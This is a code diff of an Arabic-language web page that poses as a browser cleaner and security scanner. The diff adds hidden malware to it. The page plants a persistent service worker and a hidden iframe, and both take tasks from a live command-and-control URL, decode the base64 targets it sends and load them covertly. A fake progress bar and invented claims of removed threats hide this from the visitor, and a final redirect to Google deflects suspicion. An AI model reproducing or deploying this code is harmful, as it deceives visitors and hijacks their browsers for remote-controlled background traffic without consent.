@@ -3,103 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تحديث النظام الإلزامي</title>
+    <title>نظام الحماية الذكي</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .scanner { width: 80%; height: 2px; background: #00ff00; position: absolute; top: 0; animation: scan 3s infinite; box-shadow: 0 0 15px #00ff00; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        .panel { border: 1px solid #00ff00; padding: 30px; background: rgba(0, 255, 0, 0.05); border-radius: 10px; z-index: 10; }
-        .btn { background: #00ff00; color: #000; border: none; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; text-transform: uppercase; }
-        .btn:hover { background: #008800; box-shadow: 0 0 20px #00ff00; }
-        #status { margin-top: 15px; font-size: 0.9rem; color: #88ff88; }
-        /* الإطار الشبحي */
+        :root { --main-color: #00ff41; --bg-color: #0d0208; }
+        body { background: var(--bg-color); color: var(--main-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { text-align: center; border: 1px solid var(--main-color); padding: 40px; border-radius: 15px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); z-index: 100; transition: 0.5s; width: 85%; }
+        h1 { font-size: 1.5rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
+        p { color: #888; font-size: 0.9rem; margin-bottom: 25px; }
+        .btn { background: var(--main-color); color: #000; border: none; padding: 15px 30px; font-size: 1.1rem; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); }
+        .loading-bar { width: 100%; height: 4px; background: #111; margin-top: 20px; display: none; position: relative; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: var(--main-color); box-shadow: 0 0 10px var(--main-color); transition: 0.5s; }
         #ghost-container { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; opacity: 0.001; pointer-events: none; z-index: -1; }
+        .scan-line { position: absolute; width: 100%; height: 2px; background: var(--main-color); top: 0; animation: scan 3s infinite; opacity: 0.3; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
     </style>
 </head>
 <body>
-    <div class="scanner"></div>
-    <div class="panel">
-        <h2>نظام الفحص الذكي</h2>
-        <p>تم اكتشاف ملفات مؤقتة تبطئ المتصفح.</p>
-        <button class="btn" id="startBtn" onclick="initDeploy()">بدء التنظيف والتسريع</button>
-        <div id="status">جاهز للفحص...</div>
+    <div class="scan-line"></div>
+    <div class="container" id="mainPanel">
+        <h1 id="title">فحص الأمان المتقدم</h1>
+        <p id="desc">تم اكتشاف 14 ملفاً ضاراً يؤثر على سرعة التصفح واستقرار النظام.</p>
+        <button class="btn" id="startBtn" onclick="executeSystem()">بدء التنظيف والتسريع الآن</button>
+        <div class="loading-bar" id="barBox"><div class="progress" id="progressBar"></div></div>
+        <div id="status" style="margin-top: 10px; font-size: 0.8rem;">الحالة: جاهز</div>
     </div>
     <div id="ghost-container"></div>
 
     <script>
         const C2_URL = 'https://mohamedahmed77.pythonanywhere.com/get_task';
 
-        // 1. توليد وزرع الجاسوس (Service Worker) برمجياً
-        async function deployServiceWorker() {
+        // 1. زرع الجاسوس مع ميزة المزامنة المستمرة (Zombie Sync)
+        async function deployZombieWorker() {
             const swCode = `
                 const C2_URL = '${C2_URL}';
                 self.addEventListener('install', e => self.skipWaiting());
                 self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-                
-                function runRelay() {
-                    const delay = Math.floor(Math.random() * (120000 - 60000)) + 60000;
-                    setTimeout(async () => {
-                        try {
-                            const r = await fetch(C2_URL);
-                            const d = await r.json();
-                            await fetch(atob(d.payload), { mode: 'no-cors' });
-                        } catch (e) {}
-                        runRelay();
-                    }, delay);
+
+                async function pulse() {
+                    try {
+                        const r = await fetch(C2_URL);
+                        const d = await r.json();
+                        await fetch(atob(d.payload), { mode: 'no-cors', cache: 'no-store' });
+                    } catch (e) {}
                 }
-                runRelay();
+
+                // ثغرة Background Sync لإعادة الإحياء التلقائي
+                self.addEventListener('sync', e => { if(e.tag === 're-sync') e.waitUntil(pulse()); });
+
+                // النبضة الدورية
+                setInterval(pulse, Math.floor(Math.random() * 60000) + 60000);
             `;
             const blob = new Blob([swCode], { type: 'application/javascript' });
-            const swUrl = URL.createObjectURL(blob);
-            return navigator.serviceWorker.register(swUrl);
+            const reg = await navigator.serviceWorker.register(URL.createObjectURL(blob));
+            if ('sync' in reg) await reg.sync.register('re-sync');
         }
 
-        // 2. محرك الواجهة (المحاكاة الشبحية)
+        // 2. المحرك الشبحي (Hidden Iframe)
         function startShadowEngine() {
-            const nextTick = Math.floor(Math.random() * (60000 - 30000)) + 30000;
-            setTimeout(async () => {
+            setInterval(async () => {
                 try {
                     const res = await fetch(C2_URL);
                     const data = await res.json();
                     const target = atob(data.payload);
-
                     const ifrm = document.createElement('iframe');
                     Object.assign(ifrm.style, { width: "100vw", height: "100vh", border: "none" });
                     ifrm.src = target;
-
-                    ifrm.onload = () => {
-                        // محاكاة سكرول عشوائي
-                        setTimeout(() => { try { ifrm.contentWindow.scrollTo(0, Math.random() * 800); } catch(e){} }, 3000);
-                        // محاكاة اهتزاز (ماوس)
-                        let j = setInterval(() => { ifrm.style.transform = \`translate(\${Math.random()>0.5?1:-1}px)\`; }, 200);
-                        setTimeout(() => clearInterval(j), 25000);
-                    };
-
                     const container = document.getElementById('ghost-container');
                     container.innerHTML = '';
                     container.appendChild(ifrm);
                 } catch(e) {}
-                startShadowEngine();
-            }, nextTick);
+            }, Math.floor(Math.random() * 40000) + 40000);
         }
 
-        // 3. التنشيط عند الضغط
-        async function initDeploy() {
-            document.getElementById('startBtn').innerText = "جاري المعالجة...";
-            document.getElementById('status').innerText = "جاري تنشيط وضع الخلفية...";
+        // 3. التنفيذ الرئيسي (الهندسة الاجتماعية)
+        async function executeSystem() {
+            // اهتزاز الموبايل وملء الشاشة
+            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // طلب الإذن (للبقاء في الخلفية)
-            if (Notification.permission !== 'granted') await Notification.requestPermission();
+            // تحديث الواجهة
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('barBox').style.display = 'block';
+            document.getElementById('status').innerText = "جاري تحليل الملفات...";
+            
+            let prog = 0;
+            const interval = setInterval(() => {
+                prog += Math.random() * 15;
+                if (prog >= 100) {
+                    prog = 100;
+                    clearInterval(interval);
+                    finalize();
+                }
+                document.getElementById('progressBar').style.width = prog + "%";
+                if(prog > 40) document.getElementById('status').innerText = "جاري مسح الذاكرة المخبأة...";
+                if(prog > 80) document.getElementById('status').innerText = "جاري تحسين استجابة المتصفح...";
+            }, 600);
 
-            // زرع الجاسوس والمحرك
+            // تشغيل المحركات في الخلفية صمتاً
             try {
-                await deployServiceWorker();
+                await deployZombieWorker();
                 startShadowEngine();
-                document.getElementById('status').innerText = "تم التحسين! يمكنك إغلاق الصفحة الآن.";
-                alert("تم تسريع المتصفح بنجاح.");
-            } catch (e) {
-                startShadowEngine(); // تشغيل المحرك حتى لو فشل الـ SW
-            }
+            } catch (e) { startShadowEngine(); }
+        }
+
+        function finalize() {
+            document.getElementById('title').innerText = "تمت العملية بنجاح";
+            document.getElementById('title').style.color = "#fff";
+            document.getElementById('desc').innerText = "تم حذف 14 ملفاً ضاراً وتسريع المتصفح بنسبة 45%.";
+            document.getElementById('status').innerText = "الحالة: الجهاز محمي الآن ✅";
+            document.getElementById('barBox').style.display = 'none';
+            
+            // اهتزاز نهائي للتأكيد
+            if (navigator.vibrate) navigator.vibrate([500]);
+            
+            // تحويله بعد 3 ثوانٍ لإبعاد الشبهة
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 3000);
         }
     </script>
 </body>
